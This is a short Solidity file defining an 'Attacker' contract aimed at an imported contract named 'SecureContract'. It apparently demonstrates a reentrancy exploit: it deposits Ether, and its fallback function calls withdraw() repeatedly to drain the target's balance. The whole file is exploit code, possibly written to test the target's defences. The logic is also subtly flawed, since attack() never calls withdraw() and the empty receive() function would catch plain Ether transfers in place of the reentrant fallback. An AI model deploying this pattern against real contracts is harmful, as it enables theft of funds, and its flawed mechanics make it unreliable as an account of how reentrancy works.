// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SecureContract.sol";

contract Attacker {
    SecureContract public targetContract; // Target contract to attack

    constructor(address _targetContractAddress) {
        targetContract = SecureContract(payable(_targetContractAddress));
    }

    function attack() public payable {
        require(msg.value > 0, "Attack requires a deposit");

        // Start the attack
        targetContract.deposit{value: msg.value}();
    }

    // Fallback function for reentrancy
    fallback() external payable {
        if (address(targetContract).balance > 0) {
            targetContract.withdraw();
        }
    }

    // Receive function to accept Ether without data (address().send)
    receive() external payable {
        // You can leave this empty or add logic for handling plain Ether transfers
    }
}

